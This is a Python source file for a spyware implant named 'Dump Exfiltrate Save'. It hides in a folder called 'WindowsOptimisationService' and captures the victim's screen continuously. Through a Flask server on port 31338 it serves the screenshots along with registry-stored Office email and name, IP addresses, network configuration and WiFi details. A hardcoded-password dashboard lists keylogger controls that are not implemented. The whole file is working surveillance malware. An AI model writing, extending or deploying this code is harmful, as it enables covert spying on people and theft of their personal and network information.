""" MODULE LIST """
import os
import threading
import time
import socket
import io
from collections import deque
from flask import Flask, Response, render_template_string, send_file, jsonify
import mss
from PIL import Image
import platform
import psutil
import subprocess
import requests
import winreg


""" COSTANT: 'app' is a costant with the flask app function form the imported library 'flask' """
app = Flask(__name__)

""" 
FUNCION: makeProgramDir
Function explanation:
This function (makeProgramDir), gets the username of the current user that is logged in and store it in the variable 'user_login'
after storing the data in the 'user_login' variable, it makes another variable ('screen_share_dir') with the path that we want to create.
At the end of the function it makes the directory with the imported module 'os' and it changes the working program directory from current file path to the directory that we made form the variable 'screen_share_dir'
"""
#=^.^=
def makeProgramDir():
    user_login = os.getlogin()
    screen_share_dir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
    os.makedirs(screen_share_dir, exist_ok=True)
    os.chdir(screen_share_dir)

"""
FUNCTION: capture_images
Function explanation:
This function (capture_images), continuously captures screenshots from the primary monitor using the imported 'mss' library.
It initializes a global list called 'images' to store the captured images.
Inside a loop, it grabs the current screen image, converts it to a PNG format, and appends the image data to the images list.
If the list exceeds five images, it removes the oldest one to maintain a fixed size.
The function also calculates the time taken for each capture and adjusts the sleep duration to achieve a target frame rate of 120 frames per second, ensuring efficient and timely image capturing.
"""
#=^.^=
def capture_images():
    global images
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            start = time.time()
            sct_img = sct.grab(monitor)
            img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
            with io.BytesIO() as output:
                img.save(output, format='PNG')
                images.append(output.getvalue())
                if len(images) > 5:
                    images.popleft()
            elapsed = time.time() - start
            time.sleep(max(0, 1/120 - elapsed))

""" COSTANT: 'images' global list variable """
images = deque(maxlen=5)

"""
FUNCTION: get_local_ip
Function explanation:
This function (get_local_ip), simply use the imported library 'socket' to retrieve the local ip address

Examples of locals ip:
10.XXX.XXX.XXX  ----\
172.16.XXX.XXX       | - Where XXX is a number from 0 to 255
192.168.XXX.XXX ----/
"""
#=^.^=
def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

""" COSTANT: 'SERVER_HOST' is a costant with the local ip of the target machine """
SERVER_HOST = get_local_ip()

""" COSTANT: 'SERVER_PORT' is a costant with a default port assigned from the developer"""
SERVER_PORT = 31338

""" COSTANT: 'login_page' is a costant with the login page html code """
login_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fedi 2025©">
    <meta name="dc.language" content="ita" scheme="RFC1766">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
    <script>
        function checkCredentials() {{
            var YKMs6nmx7VcV63i = document.getElementById("m2SxXVmW3tWogiS").value;
            var BeGhkaQXpn4UplY = document.getElementById("ozOSNlUtEYo4mts").value;
            var hovAsGEJkOG0mIq = btoa(BeGhkaQXpn4UplY); 
            var KDKl8J3Ih7uU0l2 = btoa(YKMs6nmx7VcV63i)

            if (KDKl8J3Ih7uU0l2 === "UERFUy1BZG1pbg==" && hovAsGEJkOG0mIq === "UERFUy1QYXNzd29yZA==") {{
                alert("Login successful");
                window.location.replace("http://{SERVER_HOST}:{SERVER_PORT}/4ee1711430410e5f2ec9d8188ac1f134");
            }} else {{
                alert("Invalid username or password");
            }}
        }}
    </script>
</head>
<body>
    <h2>Admin Login</h2>
    <form onsubmit="event.preventDefault(); checkCredentials();">
        <div>
            <label for="">Username:</label>
            <input type="text" id="m2SxXVmW3tWogiS" name="">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="ozOSNlUtEYo4mts" name="">
        </div>
        <div>
            <button type="submit">Login</button>
        </div>
    </form>
</body>
</html>"""

""" COSTANT: 'dashboard_page' is a costant with the dashboard page html code """
dashboard_page = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Fedi6431">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC
    <meta name="copyright" content="Fedi 2025©">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
</head>
<body>
    <h1>Action available</h1>
    <ol>
        <li><a href="#ScreenShare">Screen share</a></li>
        <li><a href="#Keylogger">Keylogger log</a></li>
        <li><a href="#Usage">Usage stats</a></li>
    </ol>
    <div id="screenShare">
        <script>
            function updateImage() {{
                const img = document.getElementById('screenshot');
                img.src = '/image.png?' + new Date().getTime();
            }}
            setInterval(updateImage, 100); // 10 FPS

            function saveScreenshot() {{
                const link = document.createElement('a');
                link.href = '/download.png';
                link.download = 'screenshot.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }}

            const refreshBtn = document.getElementById("btnRefresh");
            function handleClick() {{
                history.go(0);
            }}

            refreshBtn.addEventListener("click", handleClick);
        </script>
        <h1>Screen share</h1>
        <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
        <button id="btnRefresh" type="button" onclick="location.reload(true)">Refresh page</button>
        <div>
            <img id="screenshot" src="/image.png" alt="Screenshot" />
        </div>
    </div>
    <div id="Keylogger">
        <h1>Keylogger</h1>
        <button type="button">Start keylogger</button>
        <button type="button">Stop keylogger</button>
    </div>
    <div id="Usage">
        <h1>PC informations</h1>
        <p>Hey, we have another page for the PC information. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
    </div>
</body>
</html>"""

""" 
FUNCION: scan_wifi
Function explanation:
It uses the 'subprocess' module to execute a command, in this case 'netsh wlan show all' 
Command 'netsh wlan show all':
-Netsh : Network Shell 
-Wlan : Wifi interface
-Show : function to show informations about the selected interface
-All : Show all the data and settings
"""
#=^.^=
def scan_wifi():
    try:
        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
        return result
    except Exception as e:
        return str(e)

""" 
FUNCTION: get_public_ip
Function explanation:
It sends a get request with the imported module 'requests' to the api site 'https://api.ipify.org'
"""
#=^.^=
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').content.decode('utf8')
    except requests.RequestException as e:
        return f"Error getting public IP: {str(e)}"

"""
FUNCTION: get_local_network_info
Function explanation:
It uses the imported module 'subprocess' to run a command, in this case the command is 'ipconfig /all'
"""
#=^.^=
def get_local_network_info():
    try:
        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
        return result.stdout  
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {str(e)}"
    except Exception as e:
        return f"An error occurred: {str(e)}"
"""
FUNCTION: get_registry_values
Function explanation:
Get registry values from the assigned path and the assigned key by the registry editor (regedit)
"""
def get_registry_values(path, key):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
            return winreg.QueryValueEx(keyHandle, key)[0]
    except FileNotFoundError:
        return None
    except Exception as e:
        return str(e)

"""FUNCTION: get_user_info_from_registry
Function explanation:
Uses the 'get_registry_values' function to retrieve values and store it in variables"""
def get_user_info_from_registry():
    userInfo = {}
    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
            i = 0
            while True:
                try:
                    subkeyName = winreg.EnumKey(parentKey, i)
                    subkeyPath = f"{registryPath}\\{subkeyName}"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
                        email = get_registry_values(subkeyPath, "EmailAddress")
                        if email:
                            userInfo["EmailAddress"] = email
                        firstName = get_registry_values(subkeyPath, "FirstName")
                        if firstName:
                            userInfo["FirstName"] = firstName
                        lastName = get_registry_values(subkeyPath, "LastName")
                        if lastName:
                            userInfo["LastName"] = lastName
                        if len(userInfo) == 3:
                            break
                except OSError:
                    break
                i += 1
    except Exception as e:
        userInfo['Error'] = str(e)
    
    return userInfo

""" FLASK APP PAGES """
""" '/' PATH: Login path """
@app.route('/')
def login():
    return render_template_string(login_page)

""" '/4ee1711430410e5f2ec9d8188ac1f134' PATH: Dashboard path """
@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
def dashboard():
    return render_template_string(dashboard_page)

""" '/image.png' PATH: Path used to store images """
@app.route('/image.png')
def image():
    if images:
        return Response(images[-1], mimetype='image/png')
    return "404 Not Found", 404

""" '/download.png' PATH: Path used to download the stored images """
@app.route('/download.png')
def download_image():
    if images:
        return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
    return "404 Not Found", 404

""" '//16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
def informations():
    user_login = os.getlogin()  # Get the current logged-in username
    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
    system_info = {
        "Username": user_login,
        "Operating System": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
        "Hostname": socket.gethostname(),  # Get the hostname of the machine
        "IP Address": get_local_ip(),  # Get the local IP address
        "Public IP": get_public_ip(),  # Get the public IP address
        "Local Network Info": get_local_network_info(),  # Get local network configuration
        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
    }
    return jsonify(system_info)

if __name__ == "__main__":
    makeProgramDir()
    images = deque(maxlen=5)
    threading.Thread(target=capture_images, daemon=True).start()
    app.run(host=SERVER_HOST, port=SERVER_PORT)
